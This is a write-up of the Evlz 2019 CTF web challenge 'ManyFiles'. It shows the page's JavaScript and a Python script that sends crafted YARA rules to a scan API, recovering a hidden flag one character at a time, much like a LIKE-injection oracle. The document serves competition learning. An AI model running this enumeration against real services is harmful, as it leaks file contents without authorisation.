# Evlz 2019 CTF - ManyFiles Write-Up (Web)
<!--Authors: OofedUp-->

```
Website http://13.232.233.247/scannie/

Author: chargE
```

Accessing the website, we are presented with the following page:

![screenshot-1](/assets/images/writeup/manyfiles-1.png)

On the left, we have a box where we can input some form of data and `Scan`, while on the right we have a Directory Listing.

When I first looked at the challenge, I figured the flag is somewhere hidden in the files listed, but I need to find a way to locate the specific file and read the flag from it. The page contains some interesting JavaScript for interacting with some APIs:

```javascript
// Swagger Conformant API
API_URL = 'http://13.232.233.247:1338'
LIST_DIR_URI = '/api/listdir'
SCAN_URI = '/api/scan'


const renderMessage = (id, message) => {
    let message_element = document.querySelector(id)
    message_element.innerHTML = `<h2>${message}</h2>`
}

const renderFileList = (id, file_list) => {
    let fileListDiv = document.querySelector(id)
    let file_list_html = `<table class='minimalistBlack'><tbody>`
    file_list_html += `<thead><tr><td>Files</td></tr></thead>`
    file_list.forEach(filename => {
        file_list_html += `<tr><td>${filename}</tr></td>`
    });
    file_list_html += `</tbody></table>`

    fileListDiv.innerHTML += file_list_html
}

const processListDirResponse = (data) => {
    if(!data.directory.length) {
        renderMessage('#fileList', 'No Files Found')
        return
    }

    renderFileList('#fileList', data.directory)

}

const processMatchResponse = (data) => {
    console.log(data)
    if(data.message)
        renderMessage('#matchList', data.message)
    if(!data.matches.length) {
        renderMessage('#matchList', 'No Matches Found')
        return
    }

    document.querySelector('#match-title').hidden = false
    renderFileList('#matchList', data.matches)
}   

const fetchFileList = () => {
    fetch(API_URL+LIST_DIR_URI
    ).then( (response) => {
        return response.json()
    }).then( (data) => {
        processListDirResponse(data)
    }).catch( (error) => {
        console.log("Couldn't fetch file")
        console.log(error)
    })
}

const fetchMatchList = (data) => {
    fetch(API_URL+SCAN_URI, {
        method: "POST", // *GET, POST, PUT, DELETE, etc.
        mode: "cors", // no-cors, cors, *same-origin
        headers: {
            "Content-Type": "application/json",
        },
        redirect: "follow", // manual, *follow, error
        referrer: "no-referrer", // no-referrer, *client
        body: JSON.stringify(data) // body data type must match "Content-Type" header
    }).then( (response) => {
        return response.json()
    }).then( (data) => {
        processMatchResponse(data)
    }).catch( (error) => {
        console.log("Couldn't fetch matches")
        console.log(error)
    })
}

const scanFiles = () => {
    event.preventDefault()
    document.querySelector('#matchList').innerHTML = ''
    let rule_src = document.querySelector('#rule').value
    let encoded_rule = btoa(rule_src)
    rule_json = {
        'rule': encoded_rule
    }
    fetchMatchList(rule_json)
}

fetchFileList();
```

We can now take a closer look at the `scan` endpoint. After further fuzzing and fiddling with the endpoint, I assumed it accepts [YARA](https://github.com/VirusTotal/yara) rules. Here's an example of a yara rule that searches the current directory for a file with a string matching `evlz{`:

```
rule AsciiExample {
strings:
	// A string to match -- default is ascii
	$ascii_string = "evlz{"

condition:
	// The condition to match
	$ascii_string
}
```

With this in mind, we can build a script that will build the flag one character at a time, by seeing if the string matches any of the files. It's similar to an SQL `LIKE` Injection. Here's the script that I used:

```python
#!/usr/bin/python
#Author : OofedUp - HTsP
import requests
import string
import base64
import time

alphabet = string.ascii_lowercase+"!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"

seed = "evlz{"
flag = seed

rulepre = """
rule AsciiExample {
strings:
	// A string to match -- default is ascii
	$ascii_string = \""""

rulepost = """\"

condition:
	// The condition to match
	$ascii_string
}
"""
while "ctf" not in flag:
    for c in alphabet:
        print c
        time.sleep(0.1)
        r = requests.post("http://13.232.233.247:1338/api/scan", data={"rule":base64.b64encode(rulepre+flag+c+rulepost)}).text
        if ("568.c" in r):
            flag += c
            print flag
            break

print "[+] Flag: "+flag
```

Result: `[+] Flag: evlz{yara_rules_are_great}ctf`
